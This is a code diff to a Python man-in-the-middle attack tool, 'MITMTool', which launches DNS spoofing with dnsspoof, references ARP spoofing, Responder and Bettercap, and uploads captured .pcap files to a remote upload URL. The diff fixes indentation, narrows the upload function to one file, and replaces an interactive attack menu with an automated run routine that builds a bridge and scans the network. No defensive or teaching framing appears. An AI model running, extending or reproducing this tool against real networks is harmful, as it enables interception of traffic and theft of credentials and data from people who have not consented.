@@ -490,131 +490,60 @@ class MITMTool:
             logger.error(f"Failed to start Bettercap: {str(e)}")
             return False
 
+    # --- Corrected start_dns_spoof function ---
     def start_dns_spoof(self, interface="mitm-bridge", hosts_file=None):
-    try:
-        cmd = ["sudo", "dnsspoof", "-i", interface]
-        if hosts_file:
-            cmd.extend(["-f", hosts_file])
-        self.capture_processes['dnsspoof'] = subprocess.Popen(cmd)
-        self.active_attacks.add('DNS Spoofing')
-        logger.info(f"DNS spoofing started on {interface} with hosts file {hosts_file}")
-        return True
-    except Exception as e:
-        logger.error(f"Failed to start DNS spoofing: {str(e)}")
-        return False
+        try:
+            cmd = ["sudo", "dnsspoof", "-i", interface]
+            if hosts_file:
+                cmd.extend(["-f", hosts_file])
+            self.capture_processes['dnsspoof'] = subprocess.Popen(cmd)
+            self.active_attacks.add('DNS Spoofing')
+            logger.info(f"DNS spoofing started on {interface} with hosts file {hosts_file}")
+            return True
+        except Exception as e:
+            logger.error(f"Failed to start DNS spoofing: {str(e)}")
+            return False
 
     def stop_all_attacks(self):
         for name, proc in self.capture_processes.items():
             try:
                 proc.terminate()
                 proc.wait(timeout=5)
-                logger.info(f"Stopped {name}")
+                logger.info(f"Stopped {name} process")
             except Exception as e:
                 logger.error(f"Failed to stop {name}: {str(e)}")
         self.capture_processes.clear()
         self.active_attacks.clear()
 
-    def upload_captures(self):
+    def upload_capture(self, filepath):
         if not self.config.get("remote_upload", False):
             logger.info("Remote upload disabled in config")
             return False
-
         try:
-            for filename in os.listdir(DATA_DIR):
-                if filename.endswith(".pcap"):
-                    filepath = os.path.join(DATA_DIR, filename)
-                    with open(filepath, 'rb') as f:
-                        files = {'file': (filename, f)}
-                        response = requests.post(REMOTE_UPLOAD_URL, files=files)
-                        if response.status_code == 200:
-                            logger.info(f"Uploaded {filename} successfully")
-                            os.remove(filepath)
-                        else:
-                            logger.error(f"Failed to upload {filename}: {response.status_code}")
-            return True
+            with open(filepath, 'rb') as f:
+                files = {'file': (os.path.basename(filepath), f)}
+                response = requests.post(REMOTE_UPLOAD_URL, files=files)
+                if response.status_code == 200:
+                    logger.info(f"Successfully uploaded {filepath}")
+                    return True
+                else:
+                    logger.error(f"Upload failed with status {response.status_code}")
+                    return False
         except Exception as e:
             logger.error(f"Upload failed: {str(e)}")
             return False
 
-    def main_menu(self):
-        while True:
-            print(ASCII_ART)
-            print("1. Detect Interfaces")
-            print("2. Setup Bridge")
-            print("3. Network Scan")
-            print("4. Start ARP Spoofing")
-            print("5. Start Packet Capture")
-            print("6. Start Responder")
-            print("7. Start Bettercap")
-            print("8. Start DNS Spoofing")
-            print("9. Stop All Attacks")
-            print("10. Upload Captures")
-            print("0. Exit")
-            choice = input("Select an option: ").strip()
-
-            if choice == "1":
-                if self.detect_interfaces():
-                    print("Interfaces detected:")
-                    for iface, info in self.interfaces.items():
-                        print(f"{iface}: {info}")
-                else:
-                    print("No interfaces detected.")
-            elif choice == "2":
-                if self.setup_bridge():
-                    print("Bridge setup successfully.")
-                else:
-                    print("Failed to setup bridge.")
-            elif choice == "3":
-                self.network_scan()
-            elif choice == "4":
-                target_ip = input("Enter target IP: ").strip()
-                gateway_ip = input("Enter gateway IP: ").strip()
-                if self.arp_spoof(target_ip, gateway_ip):
-                    print("ARP spoofing started.")
-                else:
-                    print("Failed to start ARP spoofing.")
-            elif choice == "5":
-                iface = input("Enter interface for capture (default mitm-bridge): ").strip() or "mitm-bridge"
-                if self.start_packet_capture(interface=iface):
-                    print("Packet capture started.")
-                else:
-                    print("Failed to start packet capture.")
-            elif choice == "6":
-                iface = input("Enter interface for Responder (default mitm-bridge): ").strip() or "mitm-bridge"
-                if self.start_responder(interface=iface):
-                    print("Responder started.")
-                else:
-                    print("Failed to start Responder.")
-            elif choice == "7":
-                iface = input("Enter interface for Bettercap (default mitm-bridge): ").strip() or "mitm-bridge"
-                script = input("Enter Bettercap script path (optional): ").strip() or None
-                if self.start_bettercap(interface=iface, script_path=script):
-                    print("Bettercap started.")
-                else:
-                    print("Failed to start Bettercap.")
-            elif choice == "8":
-                iface = input("Enter interface for DNS spoofing (default mitm-bridge): ").strip() or "mitm-bridge"
-                hosts_file = input("Enter hosts file path (optional): ").strip() or None
-                if self.start_dns_spoof(interface=iface, hosts_file=hosts_file):
-                    print("DNS spoofing started.")
-                else:
-                    print("Failed to start DNS spoofing.")
-            elif choice == "9":
-                self.stop_all_attacks()
-                print("All attacks stopped.")
-            elif choice == "10":
-                if self.upload_captures():
-                    print("Uploads completed.")
-                else:
-                    print("Upload failed or disabled.")
-            elif choice == "0":
-                self.stop_all_attacks()
-                print("Exiting...")
-                break
-            else:
-                print("Invalid choice. Please try again.")
-            input("Press Enter to continue...")
+    def run(self):
+        print(ASCII_ART)
+        if not self.detect_interfaces():
+            logger.error("No suitable network interfaces found. Exiting.")
+            sys.exit(1)
+        if not self.setup_bridge():
+            logger.error("Failed to setup bridge. Exiting.")
+            sys.exit(1)
+        self.network_scan()
+        # Additional interactive or automated attack logic can be added here
 
 if __name__ == "__main__":
     tool = MITMTool()
-    tool.main_menu()
+    tool.run()
